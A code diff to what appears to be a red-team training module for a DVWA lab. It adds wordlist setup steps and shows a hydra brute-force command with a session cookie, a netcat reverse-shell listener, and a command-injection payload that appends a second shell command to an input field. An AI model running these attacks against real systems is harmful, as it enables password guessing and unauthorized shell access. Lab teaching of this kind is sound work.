@@ -404,7 +404,12 @@ const RED_TASKS: Task[] = [
         description: 'Guess the DVWA admin password with hydra against the Brute Force lab page.',
         instruction: 'Target the DVWA "Brute Force" lab page — NOT the main login. login.php has a per-request anti-CSRF user_token that hydra cannot submit, so a password it "finds" there will NOT actually log you in. The Brute Force page has no such token on Low. You must be LOGGED IN first: in the browser log into DVWA, set Security = Low, then copy your PHPSESSID cookie (DevTools → Application → Cookies) and paste it into the command below.',
         commands: [
-          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
+          { cmd: 'mkdir -p ~/team-artifacts/week-3', 
+            explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
+          { cmd: 'sudo apt install wordlists', 
+            explain: 'Install the wordlists package containing the rockyou password list.' },
+          { cmd: 'sudo gzip -d /usr/share/wordlists/rockyou.txt.gz', 
+            explain: 'Unzip the rockyou password list.' },
           {
             cmd: 'sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt <YOUR_TARGET_IP> -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\\: PHPSESSID=<your_session_id>; security=low:F=Username and/or password incorrect" | tee ~/team-artifacts/week-3/Brute_Force_Proof.txt',
             explain: 'Kali terminal: try every rockyou password for admin against the DVWA Brute Force page. It sends your logged-in cookie so the page answers, and keeps going until the "incorrect" failure text disappears. Replace <your_session_id> with your PHPSESSID.',
@@ -439,7 +444,7 @@ const RED_TASKS: Task[] = [
           { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
           {
             cmd: 'nc -lvnp 4444',
-            explain: '① KALI TERMINAL: start a listener and wait for the target to connect back. Leave this running in its own terminal.',
+            explain: '① KALI VM TERMINAL: start a listener and wait for the target to connect back. Leave this running in its own terminal.',
             flags: [
               { flag: 'nc', meaning: 'Netcat — raw TCP connections.' },
               { flag: '-l', meaning: 'Listen mode (wait for a connection).' },
@@ -450,7 +455,7 @@ const RED_TASKS: Task[] = [
           },
           {
             cmd: '127.0.0.1; which nc bash python3 php',
-            explain: '② BROWSER field — run this FIRST. It prints which shells the container actually has, so you can pick a payload that will work. In a stock DVWA container usually only php prints a path.',
+            explain: '② Mozilla BROWSER go to the field for injection field — run this FIRST. It prints which shells the container actually has, so you can pick a payload that will work. In a stock DVWA container usually only php prints a path.',
             flags: [
               { flag: 'which nc bash python3 php', meaning: 'Shows the path of each tool that exists in the container (a blank line = not installed).' },
             ],
